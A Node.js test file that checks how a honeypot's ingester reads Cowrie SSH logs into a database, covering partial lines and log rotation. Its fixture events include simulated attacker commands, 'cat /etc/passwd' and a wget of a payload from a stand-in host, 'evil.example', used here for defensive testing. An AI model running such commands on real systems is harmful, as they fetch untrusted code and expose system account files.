#!/usr/bin/env node
/* global console, process */
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'infini-cowrie-test-'));
process.env.DATABASE_FILE = path.join(tmp, 'infini.sqlite');
process.env.INFINI_NETWORK_HONEYPOT_ENABLED = '1';
process.env.COWRIE_HOME = tmp;
process.env.COWRIE_JSON_LOG = path.join(tmp, 'cowrie.json');

const { ensureSchema } = await import('../schema.js');
const { closeDb, getAll, getOne } = await import('../db.js');
const { pollCowrieLogOnce, __test__ } = await import('../cowrie-ingest.js');

function line(obj) {
  return `${JSON.stringify(obj)}\n`;
}

try {
  ensureSchema();
  const logPath = process.env.COWRIE_JSON_LOG;
  const events = [
    {
      eventid: 'cowrie.session.connect',
      timestamp: '2026-05-13T10:00:00.000Z',
      src_ip: '203.0.113.10',
      session: 's1',
      protocol: 'ssh',
      message: 'New connection',
    },
    {
      eventid: 'cowrie.login.failed',
      timestamp: '2026-05-13T10:00:01.000Z',
      src_ip: '203.0.113.10',
      session: 's1',
      username: 'root',
      password: 'root',
    },
    {
      eventid: 'cowrie.command.input',
      timestamp: '2026-05-13T10:00:02.000Z',
      src_ip: '203.0.113.10',
      session: 's1',
      input: 'cat /etc/passwd',
    },
    {
      eventid: 'cowrie.command.input',
      timestamp: '2026-05-13T10:00:03.000Z',
      src_ip: '203.0.113.10',
      session: 's1',
      input: 'wget http://evil.example/payload.sh',
    },
    {
      eventid: 'cowrie.session.file_download',
      timestamp: '2026-05-13T10:00:04.000Z',
      src_ip: '203.0.113.10',
      session: 's1',
      url: 'http://evil.example/payload.sh',
      outfile: 'downloads/payload.sh',
      shasum: 'abc123',
    },
    {
      eventid: 'cowrie.log.closed',
      timestamp: '2026-05-13T10:00:05.000Z',
      src_ip: '203.0.113.10',
      session: 's1',
      ttylog: 'tty/s1.log',
      duration: 5,
    },
  ];

  fs.writeFileSync(logPath, events.map(line).join('') + '{"eventid":"cowrie.command.input"');
  assert.equal(pollCowrieLogOnce(), events.length, 'complete Cowrie lines should ingest');
  assert.equal(getOne(`SELECT COUNT(*) AS n FROM network_sensor_events`)?.n, events.length);
  assert.equal(getOne(`SELECT COUNT(*) AS n FROM network_sensor_events WHERE event_type = 'cowrie.command.input'`)?.n, 2);
  assert.equal(getOne(`SELECT COUNT(DISTINCT cowrie_eventid) AS n FROM network_sensor_events`)?.n, events.length);
  assert.equal(getOne(`SELECT COUNT(*) AS n FROM decoy_access_events WHERE source = 'protocol'`)?.n, events.length);

  fs.appendFileSync(logPath, ',"timestamp":"2026-05-13T10:00:06.000Z","src_ip":"203.0.113.10","session":"s1","input":"id"}\nnot-json\n');
  assert.equal(pollCowrieLogOnce(), 1, 'previous partial line should ingest once completed');
  assert.equal(getOne(`SELECT COUNT(*) AS n FROM network_sensor_events`)?.n, events.length + 1);

  fs.truncateSync(logPath, 0);
  fs.writeFileSync(
    logPath,
    line({
      eventid: 'cowrie.login.success',
      timestamp: '2026-05-13T10:01:00.000Z',
      src_ip: '203.0.113.11',
      session: 's2',
      username: 'admin',
      password: 'admin',
    }),
  );
  assert.equal(pollCowrieLogOnce(), 1, 'truncation/rotation should reset cursor');

  const ordered = getAll(
    `SELECT event_type, payload_json FROM network_sensor_events WHERE session_id = 's1' ORDER BY hit_at ASC`,
  );
  assert.equal(ordered.length, events.length + 1);
  assert.equal(JSON.parse(ordered[2].payload_json).input, 'cat /etc/passwd');
  assert.equal(__test__.inferProtocol({ eventid: 'cowrie.client.version' }), 'ssh');

  console.log('[test-cowrie-ingest] ok');
} finally {
  closeDb();
  fs.rmSync(tmp, { recursive: true, force: true });
}
